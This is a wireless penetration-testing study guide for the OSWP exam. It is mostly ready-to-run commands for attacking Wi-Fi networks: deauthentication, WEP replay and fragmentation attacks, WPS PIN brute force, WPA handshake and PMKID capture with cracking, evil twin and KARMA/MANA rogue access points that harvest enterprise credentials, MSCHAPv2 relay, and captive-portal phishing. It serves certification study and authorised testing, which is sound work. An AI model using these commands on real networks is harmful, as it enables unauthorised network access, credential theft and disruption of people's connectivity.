Wireless Security Study Guide

## Introduction

These techniques, commands, and procedures are intended **solely for educational purposes** and in preparation for the **Offensive Security PEN-210 (OSWP)** exam. They involve methodologies that can be illegal if misused.

These notes are consolidated from multiple sources and organized by **attack flow** from initial reconnaissance to advanced wireless attacks on WEP, WPA/WPA2, WPA3, and WPA2-Enterprise networks.

> **Disclaimer**:  
> All information provided here is intended **for educational purposes only**. Test these techniques **only on networks and systems you own or have explicit permission to test**. Unauthorized use may be illegal and punishable by law.

[WiFi Hacking MindMap](https://github.com/koutto/pi-pwnbox-rogueap/tree/main/mindmap)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736836408167/05d41719-a59e-47db-b307-a2aaa5c9a29e.png?auto=compress,format&format=webp&q=75)

## 1. Dependencies & Environment Setup

Bash script to install all the listed tools in this Notes:

Check your Kali (or Linux) version:

```bash
cat /etc/os-release
uname -a
```

---

## 2. Basic Tools & Commands

### Common Wi-Fi Utilities

```bash
ip link show
iwconfig
ifconfig <interface> up
iw dev <interface> scan | grep "SSID:"
```

```bash
# Put interface into monitor mode (airmon-ng)
sudo airmon-ng start wlan0

# Or manually:
sudo ifconfig wlan0 down
sudo iw dev wlan0 set type monitor
sudo ifconfig wlan0 up

# Put interface back to managed mode
sudo airmon-ng stop wlan0mon

# Or manually:
ifconfig mon0 down
iw dev mon0 set type managed
ifconfig mon0 up
```

```bash
# Using macchanger (random MAC)
sudo ifconfig wlan0 down
sudo macchanger -r wlan0
sudo ifconfig wlan0 up

# Using macchanger (specific MAC)
sudo ifconfig wlan0 down
sudo macchanger -m 00:11:22:33:44:55 wlan0
sudo ifconfig wlan0 up
```

---

### airmon-ng Essentials

```bash
# Check for interfering processes
sudo airmon-ng check
sudo airmon-ng check kill

# Start monitor mode on wlan0
sudo airmon-ng start wlan0

# Start monitor mode on a specific channel
sudo airmon-ng start wlan0 <CHANNEL_NUMBER>

# Stop monitor mode
sudo airmon-ng stop wlan0mon
```

---

### airodump-ng Essentials

```bash
# Basic scanning on 2.4 GHz
airodump-ng wlan0mon

# Scan 5 GHz
airodump-ng --band a wlan0mon

# Capture only specific channel & BSSID, write to file
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_PREFIX> wlan0mon

# With WPS info
airodump-ng --wps wlan0mon

# Read a pcap or cap file
airodump-ng -r <capture.cap>
```

---

### aireplay-ng Essentials

```bash
# Deauthentication attack
aireplay-ng -0 <NUM_DEAUTH> -a <AP_BSSID> [-c <CLIENT_MAC>] wlan0mon

# Fake authentication (WEP/Open networks)
aireplay-ng -1 0 -e <ESSID> -a <AP_BSSID> -h <YOUR_MAC> wlan0mon

# ARP replay attack (WEP)
aireplay-ng -3 -b <AP_BSSID> -h <YOUR_MAC> wlan0mon

# Interactive packet replay
aireplay-ng -2 -b <AP_BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon

# Chop Chop attack
aireplay-ng -4 -b <AP_BSSID> -h <YOUR_MAC> wlan0mon

# Fragmentation attack
aireplay-ng -5 -b <AP_BSSID> -h <YOUR_MAC> wlan0mon
```

---

### aircrack-ng Essentials

```bash
# Crack WEP (needs sufficient IVs)
aircrack-ng <CAPTURE_FILE>

# Crack WPA/WPA2 handshake with dictionary
aircrack-ng -w <WORDLIST> -b <BSSID> <CAPTURE_FILE>

# Adjust "fudge factor" for WEP
aircrack-ng -f <FACTOR> <CAPTURE_FILE>
```

---

### Other Aircrack-NG Tools

- **airolib-ng**: Manage PMK databases for WPA precomputation
- **airdecap-ng**: Decrypt a WEP/WPA/WPA2 traffic capture offline
- **airgraph-ng**: Generate relationship graphs (CAPR / CPG) from airodump CSV
    

```bash
# Decrypt capture with known key
airdecap-ng -e <ESSID> -p <PASSWORD> <CAPTURE_FILE>

# Convert cap to hashcat .hccapx
cap2hccapx <CAPTURE_FILE>.cap <OUTPUT>.hccapx
```

---

## 3. Wireless Reconnaissance

### Scanning & Channel Hopping

1. **Put interface into monitor mode**:
```bash
sudo airmon-ng start wlan0
```
2. **Scan with airodump-ng**:
```bash
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```
3. **Focus on a specific channel**:
```bash
sudo airodump-ng -c <CHANNEL> --bssid <AP_BSSID> -w <OUTFILE> wlan0mon
```
4. **Filter by handshake**:  
Watch the top-right corner for “WPA handshake” or check with `aircrack-ng capture.cap`.

---
### Hidden SSIDs

When a network does not broadcast its SSID, you can:

1. **Deauthenticate a client**. When it reconnects, the ESSID will appear briefly in the capture.
```bash
aireplay-ng -0 10 -a <BSSID> wlan0mon
```
2. **Brute force hidden SSIDs** with a dictionary of possible names:
```bash
mdk4 wlan0mon p -t <BSSID> -f /path/to/ssid_wordlist.txt
```
### MAC Filtering & MAC Spoofing

If fake authentication fails repeatedly, the AP may be filtering MAC addresses. Use `airodump-ng` to identify a **valid** client MAC, wait until it goes offline, then spoof it:

```bash
ifconfig wlan0 down
macchanger -m <VALID_CLIENT_MAC> wlan0
ifconfig wlan0 up
```

---
## 4. Open & Captive Portal Attacks

1. **Connect to an Open Wi-Fi**:    
```bash
iwconfig wlan0 essid "<ESSID>"
dhclient -v wlan0
```
1. **MAC bypass**: If there's a captive portal restricting MAC addresses, impersonate a MAC of an already-authenticated client:
```
ifconfig wlan0 down
macchanger -m 00:11:22:33:44:55 wlan0
ifconfig wlan0 up
iwconfig wlan0 essid "<ESSID>"
dhclient -v wlan0
```
3. **Phishing on captive portal**: Tools like **wifiphisher**, **Fluxion**, or **Airgeddon** can create a rogue AP with a captive portal that harvests credentials.

---

## 5. WEP Attacks

WEP is deprecated but still tested on OSWP. These are the classic attacks:

### ARP Replay Attack (Connected Clients)

1. **Monitor & capture**:
```bash
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <CAPTURE_NAME> wlan0mon
```
2. **Fake authentication** (optional, if open auth):
```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> wlan0mon
```
3. **ARP replay**:
```bash
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> wlan0mon
```
4. **Deauth** (to trigger ARP generation):
```bash
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```
5. **Crack** once enough IVs collected:
```bash
aircrack-ng <CAPTURE_NAME-01.cap>
```
### Interactive Packet Replay

```bash
aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
aircrack-ng -z <CAPTURE_NAME.cap>
```

---
### Fake Authentication

```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> wlan0mon
```

Useful for some WEP injection attacks that require association.

---
### Deauthentication Attack on WEP

```bash
aireplay-ng -0 <COUNT> -a <BSSID> [-c <CLIENT_MAC>] wlan0mon
```

Forces WEP clients to reconnect, generating ARP packets (which you can replay).

---
### Fragmentation Attack

```bash
aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> wlan0mon
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> \
  -k 255.255.255.255 -l 255.255.255.255 \
  -y <FRAGMENT.xor> \
  -w <ARP_REQUEST>
aireplay-ng -2 -r <ARP_REQUEST> wlan0mon
aircrack-ng <CAPTURE_NAME.cap>
```
---

### Chop Chop Attack
```bash
aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> wlan0mon
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> \
  -k 255.255.255.255 -l 255.255.255.255 \
  -y <CHOPCHOP.xor> \
  -w <ARP_REQUEST>
aireplay-ng -2 -r <ARP_REQUEST> wlan0mon
aircrack-ng <CAPTURE_NAME.cap>
```

---
### Bypassing Shared Key Authentication

1. **Deauth** a real client & capture the PRGA XOR.
2. **Fake auth** using the XOR keystream: 
```bash
aireplay-ng -1 60 -e <ESSID> -y <wepshared-PRGA.xor> -a <BSSID> -h <YOUR_MAC> wlan0mon
```
3. **ARP replay** to generate IVs:
```bash
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> wlan0mon
```
4. **Crack with aircrack-ng** once enough IVs are collected.

---
## 6. WPS Attacks

### Identifying WPS Networks

```bash
wash -i wlan0mon -s
```

Check the **Lck** column. If `No`, WPS might be brute-forced.

---
### Online & Offline (Pixie Dust) Attacks

```bash
# Reaver (online brute force)
reaver -i wlan0mon -b <BSSID> -c <CHANNEL> -vv -S

# Reaver (Pixie Dust offline)
reaver -i wlan0mon -b <BSSID> -K -vv
```

**Bully** is an alternative with similar options:

```bash
bully wlan0mon -b <BSSID> -c <CHANNEL> -v 3
```

---
### Null PIN & Known PIN Databases

```bash
reaver -i wlan0mon -b <BSSID> -p '' -vv
```
Or use custom PIN lists (e.g., default WPS PINs for certain vendors).

---
## 7. WPA/WPA2 Attacks

### Handshake Capture & Cracking

1. **Capture**:
```bash
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTFILE> wlan0mon
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```
- **Verify handshake** (top-right corner in airodump-ng or `aircrack-ng <OUTFILE>.cap`).
- **Crack with dictionary**:
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> <OUTFILE>.cap
```

---
### PMKID (Client-less Attack)
```bash
hcxdumptool -i wlan0mon -o pmkid_dump.pcapng --enable_status=1
hcxpcaptool -z pmkid.16800 pmkid_dump.pcapng
hashcat -m 16800 pmkid.16800 /usr/share/wordlists/rockyou.txt
```

---
### Cracking with aircrack-ng, hashcat, coWPAtty, Pyrit, John

```bash
aircrack-ng -w <WORDLIST> -b <BSSID> <CAPTURE.cap>
```

```bash
cap2hccapx <CAPTURE.cap> <OUTPUT>.hccapx
hashcat -m 2500 <OUTPUT>.hccapx /usr/share/wordlists/rockyou.txt
# Or PMKID (16800)
hashcat -m 16800 pmkid.16800 /usr/share/wordlists/rockyou.txt
```

```bash
cowpatty -r <CAPTURE.cap> -f <WORDLIST> -s <SSID>
# Precompute PMK
genpmk -f <WORDLIST> -d <DBfile> -s <SSID>
cowpatty -r <CAPTURE.cap> -d <DBfile> -s <SSID>
```

```bash
pyrit -r <CAPTURE.cap> analyze
pyrit -r <CAPTURE.cap> -b <BSSID> -i <WORDLIST> attack_passthrough
```

```bash
aircrack-ng <CAPTURE.cap> -J out  # produce .hccap
hccap2john out.hccap > out.john
john --wordlist=<WORDLIST> out.john
```

---
## 8. WPA3 & SAE

### Offline Brute Force

WPA3 uses **SAE** (Simultaneous Authentication of Equals) for handshake. If an AP is misconfigured or if it reverts to WPA2-PSK for older clients, you can still capture a handshake or a PMKID.

**Offline SAE brute forcing** can sometimes be done with tools like **hcxdumptool** + **hashcat** (mode 22000).

---
### Downgrade Attacks

If a network supports both WPA2 and WPA3 (transition mode), you can force a **downgrade** by sending deauth or forging beacons that only advertise WPA2. The client might reconnect with WPA2-PSK, letting you capture a normal 4-way handshake to crack.

---
## 9. WPA2-Enterprise (MGT) Attacks

### Basic Concepts
- **EAP**: Framework used for authentication
- **RADIUS**: Usually the backend server handling authentication
- **Common EAP methods**: PEAP, EAP-TTLS, EAP-TLS, EAP-MSCHAPv2, EAP-GTC, etc.
- **EAP Identity**: Often sent in plaintext (username@domain).

---

### Capturing Usernames & Certificates

1. **Monitor MGT networks**:
```bash
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTFILE> wlan0mon
```
2. **Look for “Response, Identity”** with Wireshark filter:
```bash
eap.identity
```
3. **Certificate capture**:
```bash
tshark -r <OUTFILE>.cap -Y "tls.handshake.certificate" -V
```
or in Wireshark filter:
 ```bash
wlan.bssid == <BSSID> && tls.handshake.certificate
```  
---
### Evil Twin (Rogue AP) for WPA-Enterprise

Use **hostapd-mana**, **eaphammer**, or **berate_ap** to create a fake AP with the same SSID & EAP types.

```bash
# 1. Generate certificates
./eaphammer --cert-wizard

# 2. Launch rogue AP with EAP capturing:
./eaphammer -i wlan0 --channel <CHANNEL> --auth wpa-eap \
   --essid <MGT_ESSID> --creds
```

```bash
mana_wpe=1
mana_eapsuccess=1
mana_credout=/path/to/credentials.txt
```

(then `hostapd-mana /etc/hostapd-mana/myconfig.conf`)

**Deauthenticate** legit clients so they connect to the rogue AP:

```bash
aireplay-ng -0 10 -a <REAL_AP_BSSID> -c <VICTIM_CLIENT_MAC> wlan0mon
```
---
### EAP & MSCHAPv2 Cracking

When a client connects to your rogue AP using MSCHAPv2 (PEAP-MSCHAPv2, EAP-TTLS/MSCHAPv2), you capture the challenge/response:

```bash
asleap -C <CHALLENGE> -R <RESPONSE> -W <WORDLIST>
```
or
```bash
# Format for hashcat 5500
hashcat -m 5500 <EAP_MSCHAPv2_HASH> <WORDLIST>
```
---
### Relay Attacks (wpa_sycophant)

**wpa_sycophant** can relay MSCHAPv2 from a victim (connected to your rogue AP) to the real AP, effectively allowing you to join the real network **without** cracking the password.

1. **Create rogue AP** with `--wpa-sycophant` (in hostapd-mana or `berate_ap`).
2. **Run wpa_sycophant** with a config pointing to the real ESSID.
3. **Deauth** the target so it joins your rogue AP. Meanwhile, your wpa_sycophant tries connecting to the real AP with the victim’s credentials.
---
## 10. Rogue Access Points & Evil Twin

### Open Rogue AP

```bash
hostapd (or hostapd-mana) minimal config:

interface=wlan0
driver=nl80211
ssid=FreeWifi
hw_mode=g
channel=6
```
Start a DHCP server (e.g., dnsmasq) so clients get IP addresses.

---
### WPA/WPA2 Rogue AP

```bash
interface=wlan0
driver=nl80211
ssid=FakeCorp
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=AnyPassword
```

Then:
```bash
hostapd rogue.conf
```

---

### WPA2-Enterprise Rogue AP

Use **hostapd-mana** or **eaphammer** with `--auth wpa-eap` and the right TLS certs.
```bash
./eaphammer -i wlan0 --channel 6 --auth wpa-eap \
    --essid corpNet --creds
```

---

### KARMA / MANA / Loud MANA / Known-Beacons

- **KARMA**: Rogue AP responds to **directed probe requests** from clients for SSIDs in their PNL (Preferred Network List).
- **MANA**: Enhanced version of KARMA.
- **Loud MANA**: Sends beacons for all SSIDs discovered from clients or from a known wordlist.
- **Known-Beacons**: Systematically broadcast beacons for a huge SSID list (like a dictionary) to lure devices that probe those names.

```bash
# eaphammer example
./eaphammer -i wlan0 --mana --loud --known-beacons --known-ssids-file <wordlist>
```

---

## 11. Captive Portals & Credential Harvesting

Tools like **wifiphisher**, **Fluxion**, **Airgeddon** can create a **captive portal**:
1. **Evil Twin** or Karma/MANA AP
2. **dnsmasq** for DHCP & DNS
3. **Apache** or **lighttpd** to host the phishing page
4. **iptables** or **nftables** to force HTTP traffic to the captive portal

**Fluxion & Airgeddon** automatically handle:
- Launching fake AP
- Deauthing victim
- Captive portal that asks for WPA passphrase
- Verification with the captured handshake

---

## 12. Miscellaneous Commands

```bash
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log
```

```bash
sudo dhclient -v wlan0
sudo ip addr add 192.168.50.1/24 dev wlan0
```

```bash
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
```
